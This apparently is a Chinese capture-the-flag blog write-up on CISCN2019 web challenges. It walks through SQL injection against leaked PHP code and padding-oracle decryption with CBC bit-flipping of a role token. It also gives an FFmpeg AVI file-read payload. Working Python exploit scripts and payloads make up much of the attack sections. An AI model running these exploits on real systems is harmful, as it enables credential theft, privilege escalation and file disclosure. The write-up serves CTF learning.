@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      buuoj刷题笔记[CISCN2019(二)]padding oracle初学 | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>buuoj刷题笔记[CISCN2019(二)]padding oracle初学</h2>
+  <p class="post-date">2019-09-28 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h1><ol>
+<li>bak源码泄露</li>
+<li>sql注入</li>
+<li>文件上传，短标签shell日志写入</li>
+</ol>
+<p>image.php.bak源码泄露</p>
+<p>需要想办法逃逸单引号注入<code>&#39;\0&#39;</code> =&gt; <code>addslashes</code> =&gt; <code>&#39;\\\0&#39;</code> =&gt; <code>str_replace</code> =&gt; <code>&#39;\&#39;</code> 后一个单引号会被转义，前一个单引号与path字段单引号拼接。造成sql注入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">"id"</span>])?$_GET[<span class="string">"id"</span>]:<span class="string">"1"</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">"path"</span>])?$_GET[<span class="string">"path"</span>]:<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$path);</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/load/i"</span>,$sql))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"What's your problem?"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,$sql);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="comment">//secure the path</span></span><br><span class="line">$count=preg_match(<span class="string">"/(\.\.)|(config)/i"</span>,$row[<span class="string">"path"</span>]);</span><br><span class="line"><span class="keyword">if</span> ($count&gt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"What's your problem?"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$path=<span class="string">"./"</span> . $row[<span class="string">"path"</span>];</span><br><span class="line">header(<span class="string">"Content-Type: image/jpeg"</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><p>注出账号密码</p>
+<p>username: admin</p>
+<p>password: 158f494325ac421c0f4a</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">str1 = string.printable</span><br><span class="line">tmp=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> str1:</span><br><span class="line">        url = <span class="string">"http://1ac0ae3f-0633-427c-b215-229c94f5273d.node2.buuoj.cn.wetolink.com:82/image.php"</span></span><br><span class="line">        param=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">'\\0'</span>,</span><br><span class="line">            <span class="string">'path'</span>:<span class="string">f' or ascii(substr((select group_concat(password) from users),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;ord(a)&#125;</span>-- '</span></span><br><span class="line">            <span class="comment">#'path':f' or length(database())=11-- '</span></span><br><span class="line">        &#125;</span><br><span class="line">        rep = requests.get(url,params=param)</span><br><span class="line">        print(param)</span><br><span class="line">        <span class="comment">#print(rep.text)</span></span><br><span class="line">        <span class="keyword">if</span> rep.text != <span class="string">''</span>:</span><br><span class="line">            tmp+=a</span><br><span class="line">            print(<span class="string">'[+] : '</span> +tmp)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>传入的文件内容会被写进日志内文件，使用短标签写入一句话木马</p>
+<p><img src="./1569579769845.png" alt="1569579769845"></p>
+<p><img src="./1569579860807.png" alt="1569579860807"></p>
+<h1 id="padding-oracle"><a href="#padding-oracle" class="headerlink" title="padding oracle"></a>padding oracle</h1><p>参考链接：<a href="https://www.freebuf.com/articles/database/150606.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/database/150606.html</a></p>
+<p><img src="./1569586375256.png" alt="1569586375256"></p>
+<h2 id="服务器解密过程"><a href="#服务器解密过程" class="headerlink" title="服务器解密过程"></a>服务器解密过程</h2><p>服务器从右往左解密,红色圈圈为AES解密后的中间值。前一个Ciphertext是都是相应解密的iv</p>
+<h2 id="padding-oracle攻击的本质"><a href="#padding-oracle攻击的本质" class="headerlink" title="padding oracle攻击的本质"></a>padding oracle攻击的本质</h2><p>其实就是通过传递密文以及自己猜测的IV值，通过观察服务器对padding判断的结果，进而反推出中间值，最后用中间值与正确的IV异或得到明文.也就是说这个攻击直接跳过了AES,即我们未获得key值也能够得到明文。</p>
+<h2 id="padding添加原理"><a href="#padding添加原理" class="headerlink" title="padding添加原理"></a>padding添加原理</h2><p>由于是分组加解密，当块中的字节数不同时候需要添加padding以满足加解密格式。分组要求每个块的大小都要相同</p>
+<h2 id="服务器验证明文正确方式"><a href="#服务器验证明文正确方式" class="headerlink" title="服务器验证明文正确方式"></a>服务器验证明文正确方式</h2><p>padding的值与添加的字节数相同。PKCS#5标准来说，一般缺少几位，就填充几位那个数字</p>
+<p>比如：三位空缺，则这三位都要填上0x03。如果padding规则对不上就会报错，如下。</p>
+<ol>
+<li>如果解密过程没有问题，明文验证（如用户名密码验证）也通过，则会返回正常 HTTP 200</li>
+<li>如果解密过程没有问题，但是明文验证出错（如用户名密码验证），则还是会返回 HTTP 200，只是内容上是提示用户用户名密码错误</li>
+<li>如果解密过程出问题了，比如Padding规则核对不上，则会爆出 HTTP 500错误。</li>
+</ol>
+<p><img src="./1569586327792.png" alt="1569586327792"></p>
+<p>根据上面服务器判断解密过程是否正确的条件来看，只要最后padding值与个数相对应即可</p>
+<p>意味着如下公式成立：</p>
+<blockquote>
+<p>C1 ^ 中间值的最后一位 = 0×01</p>
+</blockquote>
+<p>那么按照异或运算的性质，我们不难得到：</p>
+<blockquote>
+<p>中间值的最后一位 = C1 ^ 0×01</p>
+</blockquote>
+<h2 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">用伪造的c1替换原来的c1</span><br><span class="line">循环一思路：伪造初始向量c1 ^ 中间值最后一位 =<span class="number">0x01</span> 服务器状态码正常</span><br><span class="line"></span><br><span class="line">		=&gt; 继而得到中间值</span><br><span class="line"></span><br><span class="line">循环第二次至第N次循环：伪造初始向量c1 = 上一步得到的中间值最后一位 ^ <span class="number">0x02</span></span><br><span class="line"></span><br><span class="line">最后把得到的所有中间值与原iv异或得到明文</span><br></pre></td></tr></table></figure>
+
+<p>0:16  可加可不加，服务器是从右向左解密</p>
+<p><img src="./1569640134942.png" alt="1569640134942"></p>
+<h1 id="CISCN2019-东北赛区-Day2-Web3-Point-System"><a href="#CISCN2019-东北赛区-Day2-Web3-Point-System" class="headerlink" title="[CISCN2019 东北赛区 Day2 Web3]Point System"></a>[CISCN2019 东北赛区 Day2 Web3]Point System</h1><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>wp ： <a href="https://www.zhaoj.in/read-6057.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6057.html</a></p>
+<ol>
+<li>敏感文件泄露（Robots.txt）</li>
+<li>Padding Oracle 明文推断 &amp; CBC 翻转攻击</li>
+<li>FFMpeg 任意文件读取漏洞</li>
+</ol>
+<h2 id="meta的作用"><a href="#meta的作用" class="headerlink" title="meta的作用"></a>meta的作用</h2><p>meta里的数据是供机器解读的，告诉机器该如何解析这个页面，还有一个用途是可以添加服务器发送到浏览器的http头部内容</p>
+<p>调用界面注册api，发现是作用在内网中，需要外部调用注册</p>
+<p><img src="./1569581860309.png" alt="1569581860309"></p>
+<p>登录后权限不足</p>
+<p><img src="./1569581890582.png" alt="1569581890582"></p>
+<p>login登录后返回token</p>
+<p><img src="./1569582366649.png" alt="1569582366649"></p>
+<p><code>&#39;user_role&#39;:3</code> 这里3指用户权限，需要更改为1 </p>
+<p><img src="./1569582395002.png" alt="1569582395002"></p>
+<p>登录login脚本后，将返回的token作为info脚本访问的key。info Response返回头显示user_role为3，权限不足</p>
+<p><img src="./1569582407368.png" alt="1569582407368"></p>
+<h2 id="padding-oracle攻击思路"><a href="#padding-oracle攻击思路" class="headerlink" title="padding oracle攻击思路"></a>padding oracle攻击思路</h2><p><strong>结题思路：需要先得出明文,确定3在密文中的位置，在通过cbc翻转置为1,即可有权限登录服务器,其实这里只要得到第一块block含有我们需要的讯息，后面就不需要解密</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWmdnU2d1WWRLcTJnYXZ3MXRVLzF3NWptdXM3WHo4WDgxMnlESlU4cWtiL3N1NW9wUStiQW1WdXRrNmhKdkc2Q05PNXNpVVpJdTVFTmsrSXFBbU9yWlhBPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoiZGhIaHlXS3BqT2VwbUs0RTFXdkVjUmpKSUhNR3pNcWgiLCJleHBpcmVfaW4iOjE1Njk1ODkzNzd9</span><br><span class="line">解码</span><br><span class="line">&#123;&quot;signed_key&quot;:&quot;SUN4a1NpbmdEYW5jZVJhUHsFQR4ln5VFC9L09echkYhTWQgiwZohj27JWt98&#x2F;+1ZggSguYdKq2gavw1tU&#x2F;1w5jmus7Xz8X812yDJU8qkb&#x2F;su5opQ+bAmVutk6hJvG6CNO5siUZIu5ENk+IqAmOrZXA&#x3D;&#x3D;&quot;,&quot;role&quot;:3,&quot;user_id&quot;:1,&quot;payload&quot;:&quot;dhHhyWKpjOepmK4E1WvEcRjJIHMGzMqh&quot;,&quot;expire_in&quot;:1569589377&#125;</span><br><span class="line"></span><br><span class="line">signed_key解码为乱码,</span><br></pre></td></tr></table></figure>
+
+<h2 id="解密exp"><a href="#解密exp" class="headerlink" title="解密exp"></a>解密exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7</span></span><br><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">host = <span class="string">"127.0.0.1"</span></span><br><span class="line">port = <span class="number">8233</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join([chr(ord(a[i]) ^ ord(b[i % len(b)])) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a))])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padoracle</span><span class="params">(key)</span>:</span></span><br><span class="line">    user_key_decode = base64.b64decode(key)</span><br><span class="line">    user_key_json_decode = json.loads(user_key_decode)</span><br><span class="line"></span><br><span class="line">    signed_key = user_key_json_decode[<span class="string">'signed_key'</span>]</span><br><span class="line">    signed_key_decoed = base64.b64decode(signed_key)</span><br><span class="line"></span><br><span class="line">    url = <span class="string">"http://"</span> + host + <span class="string">":"</span> + str(port) + <span class="string">"/frontend/api/v1/user/info"</span></span><br><span class="line"></span><br><span class="line">    N = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    total_plain = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> range(<span class="number">0</span>, int(len(signed_key) / <span class="number">16</span>) - <span class="number">3</span>):</span><br><span class="line"></span><br><span class="line">        token = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">        get = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">        cipher = signed_key_decoed[<span class="number">16</span> + block * <span class="number">16</span>:<span class="number">32</span> + block * <span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, N + <span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line"></span><br><span class="line">                token = signed_key_decoed[block * <span class="number">16</span>:<span class="number">16</span> + block * <span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">                padding = xor(get, chr(i) * (i - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">                c = (chr(<span class="number">0</span>) * (<span class="number">16</span> - i)) + chr(j) + padding + cipher</span><br><span class="line"></span><br><span class="line">                token = base64.b64encode(token + c)</span><br><span class="line"></span><br><span class="line">                user_key_json_decode[<span class="string">'signed_key'</span>] = token</span><br><span class="line">                header = &#123;<span class="string">'Key'</span>: base64.b64encode(json.dumps(user_key_json_decode))&#125;</span><br><span class="line"></span><br><span class="line">                res = requests.get(url, headers=header)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> res.json()[<span class="string">'code'</span>] != <span class="number">205</span>:</span><br><span class="line">                    get = chr(j ^ i) + get</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        plain = xor(get, signed_key_decoed[block * <span class="number">16</span>:<span class="number">16</span> + block * <span class="number">16</span>])</span><br><span class="line"></span><br><span class="line">        total_plain += plain</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> total_plain</span><br><span class="line"></span><br><span class="line">plain_text = padoracle(<span class="string">"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVRm1zclQ3a2FGM1FXL29vWDdVcVRpZ215TVl5MFFZK1RlSzMya3hGZW94ay9ZNnkzaG0vaEJXK2lMaXVLdnNNS1NPK1ZQQ0pGSTdPbHJTL0dsYThWWmh1Y3p2NSs4djNXckNJSE5TbVJOS2xBRjREdlI2bDBSbFVaajB6WjgzWGlBPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoid2x1NUUwN1piR3pUNDVRUEhORzVReUpQT2UyNjUwalgiLCJleHBpcmVfaW4iOjE1NTY4NTM2Mzh9"</span>)</span><br><span class="line">print(plain_text)</span><br><span class="line"><span class="comment">#&#123;"role":3,"user_id":1,"payload":"wlu5E07ZbGzT45QPHNG5QyJPOe2650jX","expire_in":1556853638&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="exp-CBC翻转"><a href="#exp-CBC翻转" class="headerlink" title="exp CBC翻转"></a>exp CBC翻转</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7</span></span><br><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">host = <span class="string">"127.0.0.1"</span></span><br><span class="line">port = <span class="number">8233</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cbc_attack</span><span class="params">(key, block, origin_content, target_content)</span>:</span></span><br><span class="line">    user_key_decode = base64.b64decode(key)</span><br><span class="line">    user_key_json_decode = json.loads(user_key_decode)</span><br><span class="line"></span><br><span class="line">    signed_key = user_key_json_decode[<span class="string">'signed_key'</span>]</span><br><span class="line">    cipher_o = base64.b64decode(signed_key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> block &gt; <span class="number">0</span>:</span><br><span class="line">        iv_prefix = cipher_o[:block * <span class="number">16</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        iv_prefix = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    iv = cipher_o[block * <span class="number">16</span>:<span class="number">16</span> + block * <span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">    cipher = cipher_o[<span class="number">16</span> + block * <span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">    iv_array = bytearray(iv)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">        iv_array[i] = iv_array[i] ^ ord(origin_content[i]) ^ ord(target_content[i])</span><br><span class="line"></span><br><span class="line">    iv = bytes(iv_array)</span><br><span class="line"></span><br><span class="line">    user_key_json_decode[<span class="string">'signed_key'</span>] = base64.b64encode(iv_prefix + iv + cipher)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(json.dumps(user_key_json_decode))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_user_info</span><span class="params">(key)</span>:</span></span><br><span class="line">    r = requests.post(<span class="string">"http://"</span> + host + <span class="string">":"</span> + str(port) + <span class="string">"/frontend/api/v1/user/info"</span>, headers = &#123;<span class="string">"Key"</span>: key&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.json()[<span class="string">'code'</span>] == <span class="number">100</span>:</span><br><span class="line">        print(<span class="string">"获取成功！"</span>)</span><br><span class="line">    <span class="keyword">return</span> r.json()[<span class="string">'data'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify_role_palin</span><span class="params">(key, role)</span>:</span></span><br><span class="line">    user_key_decode = base64.b64decode(user_key)</span><br><span class="line">    user_key_json_decode = json.loads(user_key_decode)</span><br><span class="line">    user_key_json_decode[<span class="string">'role'</span>] = role</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(json.dumps(user_key_json_decode))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"翻转 Key:"</span>)</span><br><span class="line">user_key = cbc_attack(<span class="string">"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWkV0UERnUzJqU2lhWm1wNEhQUWhvMDdwTzEzSHlHeXI4TExXcUFleDY1TzFQM09GQ2FHVSt3cE1iYyticTdXR2Y4MUN4Ujh2dEpGNXhnQ2YyRHVyL2d3PT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoiaWtJVmsyd21DQWc0cVpqV0tGMk5nT25aR3dyT3V2eFQiLCJleHBpcmVfaW4iOjE1Njk2NDUwMzF9"</span>, <span class="number">0</span>, <span class="string">'&#123;"role":3,"user_'</span>, <span class="string">'&#123;"role":1,"user_'</span>)</span><br><span class="line">user_key = modify_role_palin(user_key, <span class="number">1</span>)</span><br><span class="line">print(user_key)</span><br><span class="line">print(<span class="string">"测试拉取用户信息："</span>)</span><br><span class="line">user_info = get_user_info(user_key)</span><br><span class="line">print(user_info)</span><br><span class="line"><span class="comment">#Key: eyJleHBpcmVfaW4iOiAxNTY5NjQ1MDMxLCAicm9sZSI6IDEsICJ1c2VyX2lkIjogMSwgInBheWxvYWQiOiAiaWtJVmsyd21DQWc0cVpqV0tGMk5nT25aR3dyT3V2eFQiLCAic2lnbmVkX2tleSI6ICJTVU40YTFOcGJtZEdZVzVqWlZKaFVIc0ZRUjRsbjVWRkM5TDA5ZWNoa1loVFdRZ2l3Wm9oajI3Sld0OTgvKzFaRXRQRGdTMmpTaWFabXA0SFBRaG8wN3BPMTNIeUd5cjhMTFdxQWV4NjVPMVAzT0ZDYUdVK3dwTWJjK2JxN1dHZjgxQ3hSOHZ0SkY1eGdDZjJEdXIvZ3c9PSJ9</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>添加翻转后的cookie,刷新进入后台界面</p>
+<p><img src="./1569638915896.png" alt="1569638915896"></p>
+<h2 id="FFMpeg漏洞读取文件"><a href="#FFMpeg漏洞读取文件" class="headerlink" title="FFMpeg漏洞读取文件"></a>FFMpeg漏洞读取文件</h2><p><a href="https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py" target="_blank" rel="noopener">https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py</a> 来生成 payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 gen_xbin_avi.py file:///flag get.avi</span><br></pre></td></tr></table></figure>
+
+<p>上传avi,在下载下来</p>
+<p><img src="./1569640809772.png" alt="1569640809772"></p>
+<p><code>flag{2b38832a-9409-4742-8297-996f0ecf9126}</code></p>
+<p><img src="./1569640797530.png" alt="1569640797530"></p>
+</section>
